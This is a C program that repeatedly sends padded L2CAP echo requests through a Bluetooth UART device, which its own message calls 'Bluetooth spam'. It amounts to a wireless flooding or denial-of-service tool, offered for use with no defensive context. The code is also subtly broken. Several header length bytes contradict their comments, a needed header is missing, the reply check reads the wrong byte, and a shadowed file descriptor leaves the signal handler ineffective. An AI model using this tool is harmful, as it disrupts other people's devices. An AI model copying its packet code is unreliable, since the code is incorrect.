#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>

#define BT_UART "/dev/ttyHSL0" // Bluetooth UART device

#define UNUSED(x) (void)(x)

int fd;

// Handle SIGINT (CTRL+C)
void signal_handler(int signo) {
    printf("\nStopping Bluetooth spam...\n");
    if (fd > 0) close(fd);
    exit(0);
}

// Open and configure UART
int open_uart() {
    int fd = open(BT_UART, O_RDWR | O_NOCTTY | O_SYNC);
    if (fd < 0) {
        perror("Failed to open Bluetooth UART device");
        exit(EXIT_FAILURE);
    }

    struct termios tty;
    memset(&tty, 0, sizeof(tty));
    if (tcgetattr(fd, &tty) != 0) {
        perror("Error getting termios attributes");
        exit(EXIT_FAILURE);
    }

    cfsetospeed(&tty, B115200); // Set baud rate to 115200
    cfsetispeed(&tty, B115200);

    tty.c_cflag = (CLOCAL | CREAD | CS8); // Enable receiver, set 8-bit characters
    tty.c_iflag = 0; // No special input processing
    tty.c_oflag = 0; // No special output processing
    tty.c_lflag = 0; // No local mode processing

    tcflush(fd, TCIFLUSH);
    if (tcsetattr(fd, TCSANOW, &tty) != 0) {
        perror("Error setting termios attributes");
        exit(EXIT_FAILURE);
    }

    return fd;
}

void send_l2cap_echo_request(int fd) {
    uint8_t hci_packet[608]; // 600-byte payload + headers
    memset(hci_packet, 0, sizeof(hci_packet));

    // HCI ACL Data Header (4 bytes)
    hci_packet[0] = 0x02;  // HCI Packet Type: ACL Data
    hci_packet[1] = 0x0B;  // Handle (example: 0x000B)
    hci_packet[2] = 0x20;  // Flags: PB=10 (Start of L2CAP packet)
    hci_packet[3] = 0xFA;  // ACL Length = 606 bytes (0xFA 0x02)

    // L2CAP Header (4 bytes)
    hci_packet[4] = 0xF6;  // L2CAP Length = 600 bytes (0xF6 0x02)
    hci_packet[5] = 0x02;
    hci_packet[6] = 0x01;  // L2CAP CID = Signaling Channel (0x0001)
    hci_packet[7] = 0x00;

    // L2CAP Echo Request Header (4 bytes)
    hci_packet[8] = 0x08;  // Code: Echo Request
    hci_packet[9] = 0x01;  // Identifier
    hci_packet[10] = 0xF6; // Length = 600 bytes (0xF6 0x02)
    hci_packet[11] = 0x02;

    // Payload (600 bytes of "A")
    memset(&hci_packet[12], 'A', 600);

    // Send packet over UART
    if (write(fd, hci_packet, sizeof(hci_packet)) < 0) {
        perror("Failed to send Echo Request");
        exit(EXIT_FAILURE);
    }
    printf("Echo Request sent!\n");
}

void receive_l2cap_echo_response(int fd) {
    uint8_t buffer[1024];

    int len = read(fd, buffer, sizeof(buffer));
    if (len > 0) {
        if (buffer[6] == 0x09) {  // Check if it's an Echo Response (code 0x09)
            printf("Echo Response received!\n");
        } else {
            printf("Received unknown packet\n");
        }
    }
}

int main() {
    signal(SIGINT, signal_handler); // Handle CTRL+C

    fd = open_uart();

    while (1) {
        send_l2cap_echo_request(fd);
        receive_l2cap_echo_response(fd);
        usleep(100000);  // 100ms delay
    }

    close(fd);
    return 0;
}
